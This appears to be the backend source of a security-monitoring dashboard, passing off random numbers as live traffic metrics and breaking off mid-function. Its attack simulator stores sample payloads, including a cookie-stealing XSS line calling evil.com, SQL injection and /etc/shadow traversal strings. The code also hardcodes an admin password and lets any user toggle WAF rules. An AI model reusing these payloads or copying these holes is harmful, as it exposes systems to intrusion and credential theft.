"""SentinalIQ - FastAPI Backend Server"""

import json
import asyncio
import uuid
import random
import re
import hashlib
import os
from datetime import datetime, timezone, timedelta
from typing import Optional
from urllib.parse import urlparse

# Load .env settings (GMAIL_USER, GMAIL_APP_PASSWORD, SMTP_*) if present
from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

from fastapi import (
    FastAPI, Depends, HTTPException, WebSocket,
    WebSocketDisconnect, UploadFile, File, Form, Query, Body
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import Response
from fastapi.security import HTTPBearer
from pydantic import BaseModel, EmailStr
from sqlalchemy.orm import Session
from sqlalchemy import desc, func, or_

from models import (
    init_db, SessionLocal, User, Incident, LogEvent, ThreatIntel,
    Endpoint, WAFRule, Notification, DashboardWidget, IngestionRecord, MonitorEvent,
    WebsiteMonitor,
    generate_uuid, utcnow
)
from auth import (
    hash_password, verify_password, create_access_token,
    create_refresh_token, decode_token, get_current_user, get_db
)
from reporting import build_user_report_pdf, send_report_email, is_smtp_configured


app = FastAPI(title="SentinalIQ API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "http://127.0.0.1:5173"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# WebSocket connections
ws_connections: dict[str, list[WebSocket]] = {"alerts": []}


# ─── Pydantic Schemas ──────────────────────────────────────────────────────

class RegisterRequest(BaseModel):
    email: str
    username: str
    password: str

class LoginRequest(BaseModel):
    username: str
    password: str

class TokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    user: dict

class PasswordResetRequest(BaseModel):
    email: str

class PasswordResetConfirm(BaseModel):
    token: str
    new_password: str

class IncidentUpdate(BaseModel):
    title: Optional[str] = None
    description: Optional[str] = None
    severity: Optional[str] = None
    status: Optional[str] = None
    assignee: Optional[str] = None

class WidgetReorder(BaseModel):
    widgets: list[dict]


# ─── Events / Startup ──────────────────────────────────────────────────────

def ensure_admin_user(db: Session):
    """Create the built-in admin account if it doesn't exist, or promote
    an existing account with that username to the admin role."""
    admin = db.query(User).filter(User.username == "admin2004").first()
    if not admin:
        admin = User(
            id=generate_uuid(),
            email="admin2004@sentinaliq.io",
            username="admin2004",
            hashed_password=hash_password("admin2412"),
            role="admin",
            is_verified=True,
        )
        db.add(admin)
        db.commit()
        print("[Admin] Created built-in admin user 'admin2004'")
    elif admin.role != "admin":
        admin.role = "admin"
        admin.is_verified = True
        db.commit()
        print("[Admin] Promoted existing user 'admin2004' to admin role")
    return admin


@app.on_event("startup")
def on_startup():
    init_db()
    db = SessionLocal()
    try:
        ensure_admin_user(db)
    finally:
        db.close()
    print("SentinalIQ API server started")


# ─── Auth Endpoints ────────────────────────────────────────────────────────

@app.post("/api/auth/register")
def register(req: RegisterRequest, db: Session = Depends(get_db)):
    if db.query(User).filter(User.email == req.email).first():
        raise HTTPException(400, "Email already registered")
    if db.query(User).filter(User.username == req.username).first():
        raise HTTPException(400, "Username already taken")
    user = User(
        id=generate_uuid(),
        email=req.email,
        username=req.username,
        hashed_password=hash_password(req.password),
        is_verified=True,
    )
    db.add(user)
    db.commit()
    token = create_access_token({"sub": user.id, "role": user.role})
    refresh = create_refresh_token({"sub": user.id})
    return TokenResponse(access_token=token, refresh_token=refresh, user=user.to_dict())


@app.post("/api/auth/login")
def login(req: LoginRequest, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.username == req.username).first()
    if not user or not verify_password(req.password, user.hashed_password):
        raise HTTPException(401, "Invalid credentials")
    token = create_access_token({"sub": user.id, "role": user.role})
    refresh = create_refresh_token({"sub": user.id})
    return TokenResponse(access_token=token, refresh_token=refresh, user=user.to_dict())


@app.post("/api/auth/refresh")
def refresh(token_data: dict = Depends(get_current_user)):
    token = create_access_token({"sub": token_data["sub"], "role": token_data.get("role", "analyst")})
    return {"access_token": token}


@app.get("/api/auth/me")
def me(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == payload["sub"]).first()
    if not user:
        raise HTTPException(404, "User not found")
    return user.to_dict()


# ─── Admin Panel ───────────────────────────────────────────────────────────

def require_admin(payload: dict = Depends(get_current_user)):
    if payload.get("role") != "admin":
        raise HTTPException(403, "Admin access required")
    return payload


@app.get("/api/admin/stats")
def admin_stats(payload: dict = Depends(require_admin), db: Session = Depends(get_db)):
    """Platform-wide stats for the admin panel."""
    total_users = db.query(User).count()
    total_websites = db.query(WebsiteMonitor).count()
    total_url_scans = db.query(IngestionRecord).filter(IngestionRecord.type == "url_scan").count()
    total_file_uploads = db.query(IngestionRecord).filter(IngestionRecord.type == "file_upload").count()
    total_records_imported = db.query(func.coalesce(func.sum(IngestionRecord.records_count), 0)).scalar()
    total_incidents = db.query(Incident).count()
    total_iocs = db.query(ThreatIntel).filter(ThreatIntel.is_active == True).count()
    total_monitor_events = db.query(MonitorEvent).count()
    total_log_events = db.query(LogEvent).count()
    return {
        "total_users": total_users,
        "total_websites": total_websites,
        "total_url_scans": total_url_scans,
        "total_file_uploads": total_file_uploads,
        "total_records_imported": total_records_imported or 0,
        "total_incidents": total_incidents,
        "total_iocs": total_iocs,
        "total_monitor_events": total_monitor_events,
        "total_log_events": total_log_events,
    }


@app.get("/api/admin/users")
def admin_users(payload: dict = Depends(require_admin), db: Session = Depends(get_db)):
    """All users with their per-user activity counts."""
    users = db.query(User).order_by(User.created_at).all()
    items = []
    for u in users:
        websites = db.query(WebsiteMonitor).filter(WebsiteMonitor.user_id == u.id).count()
        url_scans = db.query(IngestionRecord).filter(
            IngestionRecord.user_id == u.id, IngestionRecord.type == "url_scan"
        ).count()
        file_uploads = db.query(IngestionRecord).filter(
            IngestionRecord.user_id == u.id, IngestionRecord.type == "file_upload"
        ).count()
        incidents = db.query(Incident).filter(Incident.user_id == u.id).count()
        monitor_events = db.query(MonitorEvent).filter(MonitorEvent.user_id == u.id).count()
        items.append({
            "id": u.id,
            "username": u.username,
            "email": u.email,
            "role": u.role,
            "is_verified": u.is_verified,
            "created_at": u.created_at.isoformat() if u.created_at else None,
            "websites_scanned": websites,
            "url_scans": url_scans,
            "file_uploads": file_uploads,
            "incidents": incidents,
            "monitor_events": monitor_events,
        })
    return {"items": items, "total": len(items)}


# ─── Dashboard Stats ───────────────────────────────────────────────────────

@app.get("/api/dashboard/stats")
def dashboard_stats(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    total_incidents = db.query(Incident).filter(Incident.user_id == user_id).count()
    open_incidents = db.query(Incident).filter(Incident.user_id == user_id, Incident.status == "open").count()
    critical_incidents = db.query(Incident).filter(Incident.user_id == user_id, Incident.severity == "critical").count()
    total_events = db.query(LogEvent).count()
    events_24h = db.query(LogEvent).filter(
        LogEvent.timestamp >= datetime.now(timezone.utc) - timedelta(hours=24)
    ).count()
    active_endpoints = db.query(Endpoint).filter(Endpoint.status == "online").count()
    total_endpoints = db.query(Endpoint).count()
    total_iocs = db.query(ThreatIntel).filter(ThreatIntel.is_active == True).count()
    waf_blocked = db.query(WAFRule).with_entities(func.sum(WAFRule.hits)).scalar() or 0
    # Per-user stats
    my_scans = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user_id
    ).count()
    my_uploads = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user_id,
        IngestionRecord.type == "file_upload"
    ).count()
    my_total_imported = db.query(func.coalesce(func.sum(IngestionRecord.records_count), 0)).filter(
        IngestionRecord.user_id == user_id
    ).scalar()
    # Website monitoring stats
    monitored_websites = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.user_id == user_id
    ).count()
    monitor_events_today = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
    ).count()

    return {
        "total_incidents": total_incidents,
        "open_incidents": open_incidents,
        "critical_incidents": critical_incidents,
        "total_events": total_events,
        "events_24h": events_24h,
        "active_endpoints": active_endpoints,
        "total_endpoints": total_endpoints,
        "total_iocs": total_iocs,
        "waf_blocked": waf_blocked,
        "security_score": max(0, 100 - (critical_incidents * 10 + open_incidents * 3)),
        "my_scans": my_scans,
        "my_uploads": my_uploads,
        "my_total_imported": my_total_imported,
        "monitored_websites": monitored_websites,
        "monitor_events_today": monitor_events_today,
    }


@app.get("/api/dashboard/attack-vectors")
def attack_vectors(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    vectors = db.query(Incident.source, func.count(Incident.id)).filter(
        Incident.user_id == user_id
    ).group_by(Incident.source).all()
    return [{"name": v[0] or "Unknown", "value": v[1]} for v in vectors]


@app.get("/api/dashboard/severity-breakdown")
def severity_breakdown(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    breakdown = db.query(Incident.severity, func.count(Incident.id)).filter(
        Incident.user_id == user_id
    ).group_by(Incident.severity).all()
    return [{"name": s[0], "value": s[1]} for s in breakdown]


@app.get("/api/dashboard/recent-activity")
def recent_activity(limit: int = 20, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    events = db.query(LogEvent).order_by(desc(LogEvent.timestamp)).limit(limit).all()
    # Also include user's own ingestion records
    ingests = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user_id
    ).order_by(desc(IngestionRecord.created_at)).limit(5).all()
    # Convert ORM objects to dicts before merging (LogEvent has no .get())
    events = [e.to_dict() for e in events]
    # Convert ingestion records to activity format
    ingest_activity = []
    for rec in ingests:
        ingest_activity.append({
            "id": rec.id,
            "message": rec.summary,
            "source": "ingestion",
            "severity": rec.status == "failed" and "high" or "low",
            "timestamp": rec.created_at.isoformat(),
            "event_type": rec.type,
        })
    # Merge both lists, sorted by timestamp descending
    merged = events + ingest_activity
    merged.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
    return merged[:limit]


@app.get("/api/dashboard/incident-timeline")
def incident_timeline(days: int = 30, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    cutoff = datetime.now(timezone.utc) - timedelta(days=days)
    incidents = db.query(Incident).filter(
        Incident.user_id == user_id,
        Incident.created_at >= cutoff
    ).order_by(Incident.created_at).all()
    by_day = {}
    for inc in incidents:
        day = inc.created_at.strftime("%Y-%m-%d")
        by_day[day] = by_day.get(day, 0) + 1
    return [{"date": k, "count": v} for k, v in sorted(by_day.items())]


# ─── Incidents ─────────────────────────────────────────────────────────────

@app.get("/api/incidents")
def list_incidents(
    status: Optional[str] = None,
    severity: Optional[str] = None,
    search: Optional[str] = None,
    page: int = 1,
    limit: int = 50,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    user_id = payload["sub"]
    query = db.query(Incident).filter(Incident.user_id == user_id)
    if status:
        query = query.filter(Incident.status == status)
    if severity:
        query = query.filter(Incident.severity == severity)
    if search:
        query = query.filter(
            Incident.title.ilike(f"%{search}%") | Incident.description.ilike(f"%{search}%")
        )
    total = query.count()
    items = query.order_by(desc(Incident.created_at)).offset((page - 1) * limit).limit(limit).all()
    return {"items": [i.to_dict() for i in items], "total": total, "page": page, "limit": limit}


@app.get("/api/incidents/{incident_id}")
def get_incident(incident_id: str, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    incident = db.query(Incident).filter(Incident.id == incident_id, Incident.user_id == payload["sub"]).first()
    if not incident:
        raise HTTPException(404, "Incident not found")
    return incident.to_dict()


@app.patch("/api/incidents/{incident_id}")
async def update_incident(
    incident_id: str,
    update: IncidentUpdate,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    incident = db.query(Incident).filter(Incident.id == incident_id, Incident.user_id == payload["sub"]).first()
    if not incident:
        raise HTTPException(404, "Incident not found")
    for field, value in update.model_dump(exclude_none=True).items():
        setattr(incident, field, value)
    if update.status == "resolved" and not incident.resolved_at:
        incident.resolved_at = datetime.now(timezone.utc)
    incident.updated_at = datetime.now(timezone.utc)
    db.commit()

    # Broadcast via WebSocket
    await broadcast_alert({
        "type": "incident_update",
        "data": incident.to_dict()
    })

    # Create a monitor event for incident creation
    if incident.severity in ["critical", "high"]:
        me = MonitorEvent(
            id=generate_uuid(),
            user_id=payload["sub"],
            event_type="incident",
            severity=incident.severity,
            message=f"Incident created: {incident.title}",
            target=incident.source,
            status="detected",
            is_active=True,
        )
        db.add(me)
        db.commit()

    return incident.to_dict()


# ─── Log Events ────────────────────────────────────────────────────────────

@app.get("/api/logs")
def list_logs(
    event_type: Optional[str] = None,
    severity: Optional[str] = None,
    source: Optional[str] = None,
    search: Optional[str] = None,
    page: int = 1,
    limit: int = 100,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    query = db.query(LogEvent)
    if event_type:
        query = query.filter(LogEvent.event_type == event_type)
    if severity:
        query = query.filter(LogEvent.severity == severity)
    if source:
        query = query.filter(LogEvent.source == source)
    if search:
        query = query.filter(LogEvent.message.ilike(f"%{search}%"))
    total = query.count()
    items = query.order_by(desc(LogEvent.timestamp)).offset((page - 1) * limit).limit(limit).all()
    return {"items": [e.to_dict() for e in items], "total": total, "page": page, "limit": limit}


# ─── Threat Intel ──────────────────────────────────────────────────────────

@app.get("/api/threats")
def list_threats(
    ioc_type: Optional[str] = None,
    severity: Optional[str] = None,
    search: Optional[str] = None,
    page: int = 1,
    limit: int = 50,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    query = db.query(ThreatIntel).filter(ThreatIntel.is_active == True)
    if ioc_type:
        query = query.filter(ThreatIntel.ioc_type == ioc_type)
    if severity:
        query = query.filter(ThreatIntel.severity == severity)
    if search:
        query = query.filter(
            ThreatIntel.ioc_value.ilike(f"%{search}%") |
            ThreatIntel.threat_actor.ilike(f"%{search}%") |
            ThreatIntel.malware_family.ilike(f"%{search}%")
        )
    total = query.count()
    items = query.order_by(desc(ThreatIntel.last_seen)).offset((page - 1) * limit).limit(limit).all()
    enriched = _enrich_threats_with_logs(items, db)
    return {"items": enriched, "total": total, "page": page, "limit": limit}


def _enrich_threats_with_logs(items, db: Session):
    """Attach related log-event intelligence to each threat IOC.

    For each IOC we find log events that reference it (source IP match for
    IP-type IOCs; message / endpoint / raw payload substring match for the
    rest) and attach: the recent matching events, a total count, and a
    severity breakdown — so the Threat Intel page can show where and how
    often this indicator has shown up in live logs.
    """
    if not items:
        return []

    # Single batched query: gather every log event that could relate to any IOC.
    # NOTE: the clauses below must stay in sync with the per-IOC re-filter in
    # the loop further down (same match rules: exact source_ip for ip-type,
    # substring on message/endpoint/raw_data otherwise).
    clauses = []
    for t in items:
        v = (t.ioc_value or "").strip()
        if not v:
            continue
        if t.ioc_type == "ip":
            clauses.append(LogEvent.source_ip == v)
        # Only substring-match values long enough to be meaningful
        if len(v) >= 3:
            clauses.append(LogEvent.message.ilike(f"%{v}%"))
            clauses.append(LogEvent.endpoint.ilike(f"%{v}%"))
            clauses.append(LogEvent.raw_data.ilike(f"%{v}%"))

    logs = []
    if clauses:
        logs = (
            db.query(LogEvent)
            .filter(or_(*clauses))
            .order_by(desc(LogEvent.timestamp))
            .limit(300)
            .all()
        )

    enriched = []
    for t in items:
        d = t.to_dict()
        v = (t.ioc_value or "").strip()
        matching = []
        if v:
            v_lower = v.lower()
            for log in logs:
                if t.ioc_type == "ip" and log.source_ip == v:
                    matching.append(log)
                    continue
                # Case-insensitive to stay in parity with the ilike clauses above
                for field in (log.message, log.endpoint, log.raw_data):
                    if field and v_lower in field.lower():
                        matching.append(log)
                        break
        severity_breakdown = {}
        for log in matching:
            severity_breakdown[log.severity] = severity_breakdown.get(log.severity, 0) + 1
        d["log_events"] = [l.to_dict() for l in matching[:5]]
        d["log_event_count"] = len(matching)
        d["log_severity_breakdown"] = severity_breakdown
        enriched.append(d)
    return enriched


@app.post("/api/threats/import")
async def import_threats(
    file: UploadFile = File(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    user_id = payload["sub"]
    filename = file.filename or "threats_import.json"
    content = await file.read()
    try:
        data = json.loads(content)
    except json.JSONDecodeError:
        raise HTTPException(400, "Invalid JSON file")

    if isinstance(data, dict):
        data = data.get("iocs", data.get("indicators", [data]))

    count = 0
    for item in data:
        ioc_type = item.get("type", item.get("ioc_type", "ip"))
        ioc_value = item.get("value", item.get("ioc_value", ""))
        if not ioc_value:
            continue
        threat = ThreatIntel(
            id=generate_uuid(),
            ioc_type=ioc_type,
            ioc_value=ioc_value,
            threat_actor=item.get("threat_actor", ""),
            malware_family=item.get("malware_family", ""),
            confidence=item.get("confidence", "medium"),
            severity=item.get("severity", "medium"),
            description=item.get("description", ""),
            source=item.get("source", "import"),
            tags=item.get("tags", ""),
        )
        db.add(threat)
        count += 1

    # Track in user's ingestion history
    record = IngestionRecord(
        id=generate_uuid(),
        user_id=user_id,
        type="file_upload",
        source=filename,
        file_type="json",
        records_count=count,
        status="completed",
        summary=f"Imported {count} threat indicators from {filename}",
    )
    db.add(record)
    db.commit()
    return {"imported": count, "message": f"Successfully imported {count} indicators"}


# ─── EDR / Endpoints ───────────────────────────────────────────────────────

@app.get("/api/endpoints")
def list_endpoints(
    status: Optional[str] = None,
    search: Optional[str] = None,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    query = db.query(Endpoint)
    if status:
        query = query.filter(Endpoint.status == status)
    if search:
        query = query.filter(
            Endpoint.hostname.ilike(f"%{search}%") |
            Endpoint.ip_address.ilike(f"%{search}%")
        )
    items = query.order_by(Endpoint.hostname).all()
    return {"items": [e.to_dict() for e in items], "total": len(items)}


@app.get("/api/endpoints/{endpoint_id}")
def get_endpoint(endpoint_id: str, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    endpoint = db.query(Endpoint).filter(Endpoint.id == endpoint_id).first()
    if not endpoint:
        raise HTTPException(404, "Endpoint not found")
    return endpoint.to_dict()


# ─── WAF ───────────────────────────────────────────────────────────────────

@app.get("/api/waf/rules")
def list_waf_rules(
    category: Optional[str] = None,
    is_active: Optional[bool] = None,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    query = db.query(WAFRule)
    if category:
        query = query.filter(WAFRule.category == category)
    if is_active is not None:
        query = query.filter(WAFRule.is_active == is_active)
    items = query.order_by(WAFRule.priority).all()
    return {"items": [r.to_dict() for r in items], "total": len(items)}


@app.patch("/api/waf/rules/{rule_id}")
def toggle_waf_rule(rule_id: str, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    rule = db.query(WAFRule).filter(WAFRule.id == rule_id).first()
    if not rule:
        raise HTTPException(404, "Rule not found")
    rule.is_active = not rule.is_active
    db.commit()
    return rule.to_dict()


# ─── Live Monitor ──────────────────────────────────────────────────────────

@app.get("/api/monitor/overview")
def monitor_overview(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Get live monitoring overview data"""
    user_id = payload["sub"]
    now = datetime.now(timezone.utc)
    
    # Active attacks (last 5 minutes) — only current user's
    five_min_ago = now - timedelta(minutes=5)
    active_attacks = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= five_min_ago,
        MonitorEvent.is_active == True
    ).count()
    
    # Total attacks today — only current user's
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    total_today = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= today_start
    ).count()
    
    # Blocked vs detected — only current user's
    blocked = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= today_start,
        MonitorEvent.status == "blocked"
    ).count()
    detected = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= today_start,
        MonitorEvent.status.in_(["detected", "investigating"])
    ).count()
    
    # Events by severity — only current user's
    severity_counts = {}
    for sev in ["critical", "high", "medium", "low", "info"]:
        count = db.query(MonitorEvent).filter(
            MonitorEvent.user_id == user_id,
            MonitorEvent.timestamp >= today_start,
            MonitorEvent.severity == sev
        ).count()
        if count > 0:
            severity_counts[sev] = count
    
    # Events by type — only current user's
    type_counts = db.query(MonitorEvent.event_type, func.count(MonitorEvent.id)).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= today_start
    ).group_by(MonitorEvent.event_type).all()
    
    # Top source IPs — only current user's
    top_ips = db.query(MonitorEvent.source_ip, func.count(MonitorEvent.id)).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= today_start
    ).group_by(MonitorEvent.source_ip).order_by(func.count(MonitorEvent.id).desc()).limit(10).all()
    
    # Attack timeline (last 60 minutes, per minute) — only current user's
    timeline = []
    for i in range(60):
        t = now - timedelta(minutes=59 - i)
        t_start = t.replace(second=0, microsecond=0)
        t_end = t_start + timedelta(minutes=1)
        count = db.query(MonitorEvent).filter(
            MonitorEvent.user_id == user_id,
            MonitorEvent.timestamp >= t_start,
            MonitorEvent.timestamp < t_end
        ).count()
        timeline.append({
            "time": t.strftime("%H:%M"),
            "count": count,
        })
    
    return {
        "active_attacks": active_attacks,
        "total_today": total_today,
        "blocked": blocked,
        "detected": detected,
        "severity_breakdown": severity_counts,
        "type_breakdown": [{"name": t[0], "count": t[1]} for t in type_counts],
        "top_ips": [{"ip": ip[0] or "Unknown", "count": ip[1]} for ip in top_ips],
        "timeline": timeline,
        "current_attack_rate": random.randint(5, 50),
        "defense_status": random.choice(["active", "active", "active", "monitoring"]),
    }


@app.get("/api/monitor/traffic")
def monitor_traffic(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Real-time traffic data with actual monitor events"""
    user_id = payload["sub"]
    now = datetime.now(timezone.utc)
    points = []
    for i in range(60):
        t = now - timedelta(seconds=59 - i)
        t_start = t.replace(microsecond=0)
        t_end = t_start + timedelta(seconds=1)
        attack_count = db.query(MonitorEvent).filter(
            MonitorEvent.user_id == user_id,
            MonitorEvent.timestamp >= t_start,
            MonitorEvent.timestamp < t_end
        ).count() if i < 10 else random.randint(0, 8)
        points.append({
            "time": t.strftime("%H:%M:%S"),
            "requests": random.randint(200, 2500),
            "blocked": random.randint(5, 200) + attack_count * 10,
            "anomalies": attack_count + random.randint(0, 5),
        })
    
    total_blocked_today = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= now.replace(hour=0, minute=0, second=0, microsecond=0),
        MonitorEvent.status == "blocked"
    ).count() or random.randint(500, 5000)
    
    return {
        "traffic": points,
        "current_rps": random.randint(200, 1800),
        "total_blocked_today": total_blocked_today,
    }


@app.get("/api/monitor/events")
def monitor_events(
    limit: int = 50,
    severity: Optional[str] = None,
    event_type: Optional[str] = None,
    status: Optional[str] = None,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Get live monitor events"""
    user_id = payload["sub"]
    query = db.query(MonitorEvent).filter(MonitorEvent.user_id == user_id).order_by(desc(MonitorEvent.timestamp))
    if severity:
        query = query.filter(MonitorEvent.severity == severity)
    if event_type:
        query = query.filter(MonitorEvent.event_type == event_type)
    if status:
        query = query.filter(MonitorEvent.status == status)
    
    total = query.count()
    items = query.limit(limit).all()
    return {"items": [e.to_dict() for e in items], "total": total}


@app.get("/api/monitor/events/recent")
def monitor_recent_events(
    seconds: int = 60,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Get monitor events from the last N seconds"""
    user_id = payload["sub"]
    cutoff = datetime.now(timezone.utc) - timedelta(seconds=seconds)
    events = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.timestamp >= cutoff
    ).order_by(desc(MonitorEvent.timestamp)).limit(50).all()
    return {"items": [e.to_dict() for e in events]}


@app.post("/api/monitor/simulate-attack")
async def simulate_attack(
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Simulate an attack event for testing purposes. If target_url is provided,
    associates the attack with the monitored website."""
    attack_type = data.get("type", random.choice(["injection", "xss", "brute_force", "scan", "ddos", "malware"]))
    severity = data.get("severity", random.choice(["low", "medium", "high", "critical"]))
    source_ip = data.get("source_ip", f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
    target_url = data.get("target_url", "")
    
    # If target_url is provided, find ALL users monitoring this website by hostname
    # The incident is tagged to the WEBSITE OWNER, not the person running the attack
    monitored_websites = []
    if target_url:
        parsed_target = urlparse(target_url if '://' in target_url else 'https://' + target_url)
        target_hostname = parsed_target.hostname or target_url
        print(f"[DEBUG] Looking up monitored websites by hostname: '{target_hostname}'...")
        monitored_websites = db.query(WebsiteMonitor).filter(
            WebsiteMonitor.hostname == target_hostname
        ).all()
        print(f"[DEBUG] Found: {len(monitored_websites)} site(s) monitoring this URL")
    
    # Attack templates
    attack_templates = {
        "injection": {
            "message": f"SQL injection attempt detected from {source_ip}",
            "method": "POST",
            "path": "/api/login",
            "payload": f"' OR 1=1--; DROP TABLE users; --",
        },
        "xss": {
            "message": f"Cross-site scripting (XSS) attempt from {source_ip}",
            "method": "GET",
            "path": "/search",
            "payload": f"<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        },
        "brute_force": {
            "message": f"Brute force login attempt detected from {source_ip}",
            "method": "POST",
            "path": "/api/auth/login",
            "payload": f"username=admin&password=password{random.randint(1,9999)}",
        },
        "scan": {
            "message": f"Port scanning activity detected from {source_ip}",
            "method": "SYN",
            "path": f"/port:{random.randint(1,65535)}",
            "payload": f"TCP SYN scan - probing ports 1-1024",
        },
        "ddos": {
            "message": f"DDoS attack pattern detected from multiple sources including {source_ip}",
            "method": "FLOOD",
            "path": "/",
            "payload": f"{random.randint(1000,10000)} requests/sec from botnet cluster",
        },
        "malware": {
            "message": f"Malware signature detected in outbound traffic from {source_ip}",
            "method": "POST",
            "path": "/api/telemetry",
            "payload": f"Base64 encoded payload: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', k=64))}",
        },
        "path_traversal": {
            "message": f"Path traversal attack from {source_ip}",
            "method": "GET",
            "path": "/../../../etc/passwd",
            "payload": f"../../../../etc/shadow",
        },
        "csrf": {
            "message": f"Cross-site request forgery attempt from {source_ip}",
            "method": "POST",
            "path": "/api/transfer",
            "payload": f"<form action='/api/transfer' method='POST'><input type='hidden' name='amount' value='1000'></form>",
        },
    }
    
    template = attack_templates.get(attack_type, attack_templates["scan"])
    target_label = monitored_websites[0].hostname if monitored_websites else random.choice(["Database Server", "Web Application", "Authentication Service", "Load Balancer", "Web Server", "C2 Server Communication", "Payment API"])
    
    countries = ["Russia", "China", "North Korea", "Iran", "Ukraine", "United States", "Germany", "Netherlands", "Brazil", "Nigeria", "Vietnam", "India"]
    status_options = ["blocked", "blocked", "blocked", "detected", "investigating"]
    
    # Determine the target user_id: use the website owner's ID if target is monitored,
    # otherwise use the authenticated user's ID
    target_user_id = monitored_websites[0].user_id if monitored_websites else payload["sub"]
    
    event = MonitorEvent(
        id=generate_uuid(),
        user_id=target_user_id,
        event_type=attack_type,
        severity=severity,
        source_ip=source_ip,
        source_country=random.choice(countries),
        target=target_label,
        method=template["method"],
        path=template["path"],
        user_agent=f"Mozilla/5.0 (compatible; {random.choice(['AttackBot/1.0', 'Malice/2.1', 'HackerTool/3.0', 'Nikto/2.5', 'SQLMap/1.8'])})",
        payload=template["payload"],
        message=template["message"],
        status=data.get("status", random.choice(status_options)),
        is_active=True,
    )
    db.add(event)
    db.commit()
    
    # Also create a log event
    log = LogEvent(
        id=generate_uuid(),
        source_ip=source_ip,
        event_type="warning" if severity in ["low", "medium"] else "critical",
        message=template["message"],
        source="live_monitor",
        severity=severity,
        raw_data=template["payload"],
    )
    db.add(log)
    db.commit()
    
    # If this attack targets monitored websites, create incidents & update scores for ALL owners
    incidents = []
    for mw in monitored_websites:
        if severity in ["high", "critical"]:
            inc = Incident(
                id=generate_uuid(),
                user_id=mw.user_id,
                title=f"{severity.title()} {attack_type.replace('_', ' ').title()} on {mw.hostname}",
                description=f"A {severity} severity {attack_type} attack was detected targeting {target_url} from IP {source_ip}.",
                severity=severity,
                status="open",
                source=mw.hostname,
                category=attack_type,
            )
            db.add(inc)
            incidents.append(inc)
            mw.incident_count += 1
        
        # Update threat score
        if severity == "critical":
            mw.threat_score = min(100, mw.threat_score + 15)
        elif severity == "high":
            mw.threat_score = min(100, mw.threat_score + 8)
        elif severity == "medium":
            mw.threat_score = min(100, mw.threat_score + 3)
        
        if mw.threat_score >= 60:
            mw.status = "under_attack"
    
    if monitored_websites:
        db.commit()
    
    # Broadcast via WebSocket
    await broadcast_alert({
        "type": "new_attack",
        "data": event.to_dict()
    })
    
    result = event.to_dict()
    if incidents:
        result["incidents"] = [i.to_dict() for i in incidents]
    if monitored_websites:
        result["websites"] = [w.to_dict() for w in monitored_websites]
    return result


@app.post("/api/monitor/simulate-wave")
async def simulate_attack_wave(
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Simulate a wave of attacks (multiple events)"""
    count = min(data.get("count", 10), 100)
    attack_types = ["injection", "xss", "brute_force", "scan", "ddos", "malware", "path_traversal", "csrf"]
    severities = ["low", "medium", "high", "critical"]
    
    created = []
    for _ in range(count):
        attack_type = random.choice(attack_types)
        severity = random.choices(severities, weights=[4, 3, 2, 1])[0]
        source_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        
        # Make the call recursively by calling the simulate-attack logic inline
        countries = ["Russia", "China", "North Korea", "Iran", "Ukraine", "United States", "Germany", "Netherlands", "Brazil", "Nigeria", "Vietnam", "India"]
